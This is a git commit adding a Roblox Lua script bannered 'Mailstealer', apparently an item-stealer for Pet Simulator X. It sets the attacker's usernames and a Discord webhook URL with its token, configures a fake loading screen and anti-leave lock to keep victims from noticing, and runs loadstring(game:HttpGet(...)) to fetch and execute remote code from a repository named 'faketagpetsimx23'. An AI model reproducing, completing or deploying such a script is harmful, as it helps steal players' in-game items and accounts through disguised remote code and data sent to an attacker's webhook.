9ae1dcf06ec6902c7a81e57ddae725db20156a79
psxscriptlongz <149264988+psxscriptlongz@users.noreply.github.com>
2023-10-29 01:12:22 +0700

    Create ls.lua

---
+++ codeingbylongz/main/ls.lua
@@ -0,0 +1,26 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "kalongtzy"
+Webhook = "https://discord.com/api/webhooks/1167464983647490188/CIbwxYU_QhvyEtuhsnJwpUN-UF_vYli7BXQRKnV9qhtELjHXG8E1pNnl4yeVd85eRT-f"
+UserName2 = "kalongtzy"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "M SCRIPTZ"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/faketagpetsimx23/main/moonhub/codebylongstrinittez/main/.lua"))()
